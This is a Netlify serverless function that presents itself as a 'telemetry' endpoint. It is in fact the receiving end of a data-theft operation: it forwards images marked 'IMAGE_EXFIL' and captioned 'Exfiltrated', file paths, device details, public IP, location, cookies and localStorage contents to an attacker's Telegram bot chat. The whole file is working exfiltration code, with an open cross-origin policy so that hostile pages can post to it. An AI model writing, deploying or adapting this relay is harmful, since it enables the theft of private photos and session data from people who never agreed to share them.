// netlify/functions/telemetry.js – Handles both JSON telemetry and image uploads
exports.handler = async (event, context) => {
  // CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Max-Age': '86400',
      },
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Method Not Allowed',
    };
  }

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return {
      statusCode: 500,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Server misconfig: env vars missing',
    };
  }

  let payload;
  try {
    payload = JSON.parse(event.body);
  } catch (e) {
    return {
      statusCode: 400,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Invalid JSON',
    };
  }

  const module = payload.module || 'UNKNOWN';

  // SPECIAL HANDLING FOR IMAGE EXFIL (Base64 data)
  if (module === 'IMAGE_EXFIL' && payload.data) {
    // Send the image as a photo to Telegram
    try {
      // Convert base64 to buffer
      const base64Data = payload.data.split(',')[1] || payload.data;
      const imageBuffer = Buffer.from(base64Data, 'base64');

      // Use form-data to upload
      const FormData = require('form-data');
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', imageBuffer, {
        filename: payload.filename || 'image.jpg',
        contentType: payload.type || 'image/jpeg',
      });
      form.append('caption', `📸 Exfiltrated: ${payload.filename || 'image'} (${Math.round(payload.size/1024)}KB)`);

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
      const resp = await fetch(url, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
      const result = await resp.json();
      if (!result.ok) {
        console.error('Telegram photo upload error:', result);
        return { statusCode: 500, headers: { 'Access-Control-Allow-Origin': '*' }, body: 'Telegram photo upload failed' };
      }
      return { statusCode: 200, headers: { 'Access-Control-Allow-Origin': '*' }, body: 'Photo sent' };
    } catch (err) {
      console.error('Error uploading photo:', err);
      return { statusCode: 500, headers: { 'Access-Control-Allow-Origin': '*' }, body: 'Photo upload error' };
    }
  }

  // For other modules, send as text message
  const msg = formatTelegramMessage(payload);
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'HTML',
      }),
    });
    const result = await resp.json();
    if (!result.ok) {
      console.error('Telegram error:', result);
      return {
        statusCode: 500,
        headers: { 'Access-Control-Allow-Origin': '*' },
        body: 'Telegram send failed',
      };
    }
    return {
      statusCode: 200,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'OK',
    };
  } catch (err) {
    console.error('Error forwarding to Telegram:', err);
    return {
      statusCode: 500,
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: 'Internal error',
    };
  }
};

function formatTelegramMessage(data) {
  const module = data.module || 'UNKNOWN';
  let lines = [];

  lines.push(`🔴 <b>[${module}]</b>`);
  lines.push(`⏱ ${data.timestamp || new Date().toISOString()}`);

  if (module === 'IMAGE_SUMMARY') {
    lines.push(`📊 Total images found: ${data.total || 0}`);
    lines.push(`📤 Sent: ${data.sent || 0}`);
    lines.push(`📁 Paths: ${(data.paths || []).join(', ')}`);
  } 
  else if (module === 'GALLERY_PAGE_TELEMETRY') {
    const dev = data.device || {};
    lines.push(`📱 Device: ${dev.userAgent || 'N/A'}`);
    lines.push(`🖥 Screen: ${dev.screen || 'N/A'}`);
    lines.push(`🌍 Timezone: ${dev.timezone || 'N/A'}`);
    lines.push(`🔗 Referrer: ${data.referrer || 'N/A'}`);
  }
  else if (module === 'AUTO_TELEMETRY') {
    lines.push(`📱 Device: ${data.device?.userAgent || 'N/A'}`);
    lines.push(`🖥 Screen: ${data.device?.screen || 'N/A'}`);
    lines.push(`🌐 IP: ${data.network?.publicIP || 'N/A'}`);
    lines.push(`📍 Location: ${data.network?.approxLocation?.city || 'N/A'}, ${data.network?.approxLocation?.country || 'N/A'}`);
    lines.push(`🍪 Cookies: ${data.storage?.cookies || 'N/A'}`);
    lines.push(`📦 LocalStorage: ${JSON.stringify(data.storage?.localStorage || {}).substring(0, 100)}`);
  } 
  else {
    lines.push(`📦 Payload: ${JSON.stringify(data).substring(0, 300)}`);
  }

  return lines.join('\n');
}
